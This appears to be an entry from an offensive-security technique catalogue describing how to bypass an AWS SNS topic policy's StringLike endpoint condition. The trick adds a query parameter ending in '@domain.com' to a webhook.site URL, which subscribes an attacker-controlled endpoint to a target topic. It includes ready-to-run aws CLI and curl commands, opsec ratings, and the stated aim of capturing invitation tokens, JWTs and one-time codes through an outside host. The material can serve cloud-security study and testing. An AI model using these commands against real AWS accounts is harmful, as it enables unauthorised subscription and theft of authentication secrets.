# AWS SNS Attack Techniques

### SNS Topic StringLike Endpoint Condition Bypass via Query Parameter [added: 2026-05]
- **Tags:** #AWS #SNS #PolicyBypass #StringLike #WebhookExfil #IAMCondition #HTTPSSubscription #QueryParamBypass #TokenCapture #SNSSubscribe
- **Trigger:** SNS topic policy restricts `sns:Endpoint` with a `StringLike` condition (e.g., `*@domain.com`); need to subscribe a controlled HTTPS endpoint to receive SNS notifications; direct email subscription unavailable (no MX records, firewalled SMTP, domain not controlled)
- **Prereq:** SNS topic ARN known; AWS credentials with `sns:Subscribe` allowed by the resource-based policy (base user may succeed where assumed role fails if role identity policy lacks permission); HTTPS endpoint reachable from SNS (webhook.site, Burp Collaborator, etc.)
- **Yields:** Confirmed HTTPS SNS subscription receiving all topic notifications; captures invitation tokens, JWTs, one-time codes, or any payload published to the topic
- **Opsec:** Low (SNS subscribe is a standard API call; webhook.site is public infrastructure)
- **Context:** `StringLike` with `*@domain.com` is a string prefix/suffix match, not semantic email validation. A URL like `https://webhook.site/<uuid>?x=@domain.com` passes the condition because the endpoint string ends with `@domain.com`. SNS only validates that the string matches — it does not parse the URL to confirm the query parameter is not part of the host. Also note: the base user and assumed roles may have different identity policies — if the role's identity policy blocks `sns:Subscribe`, try base user credentials (`unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN`).
- **Payload/Method:**
```bash
# Use base user credentials (not assumed role if role identity policy blocks sns:Subscribe)
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Subscribe webhook.site with query param to satisfy *@target-domain.com StringLike
WEBHOOK_UUID="<your-webhook-site-uuid>"
TOPIC_ARN="arn:aws:sns:us-east-1:<TARGET-ACCT>:BirthdayPartyInvites"

aws sns subscribe \
  --topic-arn "$TOPIC_ARN" \
  --protocol https \
  --notification-endpoint "https://webhook.site/${WEBHOOK_UUID}?x=@domain.com" \
  --region us-east-1
# → {"SubscriptionArn": "pending confirmation"}

# Confirm subscription: SNS sends a SubscriptionConfirmation POST to webhook.site
# The webhook receives a JSON body with "SubscribeURL" — fetch it to confirm:
# curl -s "<SubscribeURL>"

# Trigger the application to publish to SNS, then read the token from webhook.site
# Token arrives as SNS Notification JSON body at the webhook endpoint
```
